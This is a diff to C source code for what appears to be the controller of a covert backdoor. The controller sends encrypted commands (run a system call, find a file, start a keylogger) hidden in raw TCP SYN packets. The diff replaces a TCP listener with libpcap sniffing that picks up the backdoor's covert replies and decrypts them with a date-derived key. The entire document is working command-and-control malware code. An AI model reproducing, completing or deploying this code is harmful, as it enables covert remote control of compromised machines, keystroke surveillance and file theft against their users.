@@ -7,8 +7,9 @@ static void executeSystemCall(netInfo *info, char *commandData);
 static void findFile(netInfo *info, char *commandData);
 static void keylogger(netInfo *info);
 static void sendCommand(netInfo *info, int command, char *commandData);
-static int acceptReturningTcpConnection();
-static int bindAddress(int port, int *socket);
+static char *getData(char *data, int length);
+void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
+static void listenForResponse(netInfo *info);
 
 int main (int argc, char **argv)
 {
@@ -84,7 +85,7 @@ static void executeSystemCall(netInfo *info, char *commandData)
     sendCommand(info, EXECUTE_SYSTEM_CALL, commandData);
     
     // Wait for the response from the backdoor
-    backdoorSocket = acceptReturningTcpConnection();
+    listenForResponse(info);
 }
 
 static void findFile(netInfo *info, char *commandData)
@@ -104,7 +105,7 @@ static void findFile(netInfo *info, char *commandData)
     sendCommand(info, FIND_FILE, commandData);
     
     // Wait for the response from the backdoor
-    backdoorSocket = acceptReturningTcpConnection();
+    listenForResponse(info);
     
     // Receive the data and write it to the file
     while ((bytesRead = recv(backdoorSocket, buffer, PATH_MAX, 0)) > 0)
@@ -120,53 +121,136 @@ static void keylogger(netInfo *info)
 {
     // Send the command to the backdoor
     sendCommand(info, KEYLOGGER, NULL);
+    
+    // Wait for the response from the backdoor
+    listenForResponse(info);
 }
 
-static int acceptReturningTcpConnection()
+static void listenForResponse(netInfo *info)
 {
-    int listenSocket = 0;
-    int backdoorSocket = 0;
-    int one = 1;
-    struct sockaddr_in sa;
-    socklen_t sa_len;
+    char errorBuffer[PCAP_ERRBUF_SIZE];
+    struct bpf_program fp;
+    char *filter = malloc(sizeof(char) * FILTER_BUFFER);
+    pcap_t *handle;
+    pcap_if_t *nics;
+    pcap_if_t *nic;
+    bpf_u_int32 net;
+    bpf_u_int32 mask;
     
-    if ((listenSocket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+    // Get the devices on the machine
+    if (pcap_findalldevs(&nics, errorBuffer) == -1)
     {
-        systemFatal("Can't create a socket");
+        systemFatal("Unable to retrieve device list");
     }
     
-    if (setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) == -1)
+    // Find a suitable nic from the device list
+    for (nic = nics; nic; nic = nic->next)
     {
-        systemFatal("Cannot set socket options");
+        if (pcap_lookupnet(nic->name, &net, &mask, errorBuffer) != -1)
+        {
+            break;
+        }
     }
     
-    if (bindAddress(CONNECTION_PORT, &listenSocket) == -1)
+    // Open the session
+    handle = pcap_open_live(nic->name, SNAP_LEN, 0, 0, errorBuffer);
+    if (handle == NULL)
     {
-        systemFatal("Error binding the socket");
+        systemFatal("Unable to open live capture");
     }
     
-    if (listen(listenSocket, 5) == -1)
+    // Create and parse the filter to the capture
+    snprintf(filter, FILTER_BUFFER, "src %s and src port %s", DEST_IP, SOURCE_PORT_STRING);
+    if (pcap_compile(handle, &fp, filter, 0, net) == -1)
     {
-        systemFatal("Listen error");
+        systemFatal("Unable to compile filter");
     }
     
-    if ((backdoorSocket = accept(listenSocket, (struct sockaddr *)&sa, &sa_len)) == -1)
+    // Set the filter on the listening device
+    if (pcap_setfilter(handle, &fp) == -1)
     {
-        systemFatal("Error accepting connection");
+        systemFatal("Unable to set filter");
     }
     
-    return backdoorSocket;
+    // Call pcap_loop and process packets as they are received
+    if (pcap_loop(handle, -1, receivedPacket, NULL) == -1)
+    {
+        systemFatal("Error in pcap_loop");
+    }
+    
+    // Clean up
+    free(filter);
+    pcap_freecode(&fp);
+    pcap_close(handle);
 }
 
-static int bindAddress(int port, int *socket)
+void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 {
-    struct sockaddr_in address;
-    bzero((char *)&address, sizeof(struct sockaddr_in));
-    address.sin_family = AF_INET;
-    address.sin_port = htons(port);
-    address.sin_addr.s_addr = htonl(INADDR_ANY);
+    const struct ip *iph = NULL;
+    const struct tcphdr *tcph = NULL;
+    const struct udphdr *udph = NULL;
+    char *data = NULL;
+    char *payload = NULL;
+    int ipHeaderSize = 0;
+    int tcpHeaderSize = 0;
+    int payloadSize = 0;
     
-    return bind(*socket, (struct sockaddr *)&address, sizeof(address));
+    // Get the IP header and offset value
+    iph = (struct ip*)(packet + SIZE_ETHERNET);
+#ifdef _IP_VHL
+    ipHeaderSize = IP_VHL_HL(iph->ip_vhl) * 4;
+#else
+    ipHeaderSize = iph->ip_hl * 4;
+#endif
+    
+    if (ipHeaderSize < 20)
+    {
+        return;
+    }
+    
+    // Ensure that we are dealing with one of our sneaky TCP packets
+#if defined __APPLE__ || defined __USE_BSD
+    if (iph->ip_p == IPPROTO_TCP)
+#else
+    if (iph->protocol == IPPROTO_TCP)
+#endif
+    {
+        // Get our TCP packet and the header size
+        tcph = (struct tcphdr*)(packet + SIZE_ETHERNET + ipHeaderSize);
+        
+        // Get the data and display it
+        payload = malloc(sizeof(unsigned long));
+        memcpy(payload, (packet + SIZE_ETHERNET + ipHeaderSize + 4), sizeof(unsigned long));
+        data = getData(payload, sizeof(unsigned long));
+        printf("%s.4", data);
+    }
+#if defined __APPLE__ || defined __USE_BSD
+    else if (iph->ip_p == IPPROTO_UDP)
+#else
+    else if (iph->protocol == IPPROTO_UDP)
+#endif
+    {
+        
+    }
+    free(payload);
+}
+
+static char *getData(char *data, int length)
+{
+    char *decryptedData = NULL;
+    char date[11];
+    struct tm *tm;
+    time_t t;
+    
+    // Get the date information
+    time(&t);
+    tm = localtime(&t);
+    strftime(date, sizeof(date), "%Y:%m:%d", tm);
+    
+    // Decrypt our command using today's date
+    decryptedData = encrypt_data(data, date, length);
+    
+    return decryptedData;
 }
 
 static void sendCommand(netInfo *info, int command, char *commandData)
@@ -230,6 +314,7 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     memset(buffer, 0, packetLength);
     
     // IP structure
+#if defined __APPLE__ || defined __USE_BSD
     iph->ip_hl = 5;
     iph->ip_v = 4;
     iph->ip_tos = 16;
@@ -239,11 +324,24 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     iph->ip_ttl = 64;
     iph->ip_p = 6;
     iph->ip_sum = 0;
-    
     iph->ip_src = sin.sin_addr;
     iph->ip_dst = din.sin_addr;
+#else
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 16;
+    iph->tot_len = packetLength;
+    iph->id = htons(54321);
+    iph->frag_off = 0;
+    iph->ttl = 64;
+    iph->protocol = 6;
+    iph->check = 0;
+    iph->saddr = sin.sin_addr;
+    iph->daddr = din.sin_addr;
+#endif
     
     // TCP structure
+#if defined __APPLE__ || defined __FAVOR_BSD
     tcph->th_sport = htons(*info->srcPort);
     tcph->th_dport = htons(*info->destPort);
     memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(__uint32_t));
@@ -253,6 +351,17 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     tcph->th_win = htons(32767);
     tcph->th_sum = 0;
     tcph->th_urp = 0;
+#else
+    tcph->source = htons(SOURCE_PORT_INT);
+    tcph->dest = htons(SOURCE_PORT_INT);
+    memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(unsigned long));
+    tcph->ack_seq = 0;
+    tcph->doff = 5;
+    tcph->syn = 1;
+    tcph->window = htons(32767);
+    tcph->check = 0;
+    tcph->urg_ptr = 0;
+#endif
     
     // Build the command
     commandBuffer[0] = command + 48;
@@ -262,7 +371,7 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     // If we have command data, combine it with the command code
     if (commandData != NULL)
     {
-        strlcat(commandBuffer, commandData, PATH_MAX + 2);
+        strncat(commandBuffer, commandData, PATH_MAX + 2);
     }
 
     // Encrypt and copy the command into the packet
@@ -272,7 +381,11 @@ static void sendCommand(netInfo *info, int command, char *commandData)
            strnlen(commandBuffer, PATH_MAX) + 1);
     
     // IP checksum calculation
+#if defined __APPLE__ || defined __USE_BSD
     iph->ip_sum = csum((unsigned short *)buffer, 5);
+#else
+    iph->check = csum((unsigned short *)buffer, 5);
+#endif
     
     // Create the socket for sending the packets
     sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -288,7 +401,7 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     }
     
     // Send the packet out
-    if (sendto(sock, buffer, iph->ip_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0)
+    if (sendto(sock, buffer, iph->ip_len, 0, (struct sockaddr *) &din, sizeof(din)) < 0)
     {
         systemFatal("sendto failed");
     }
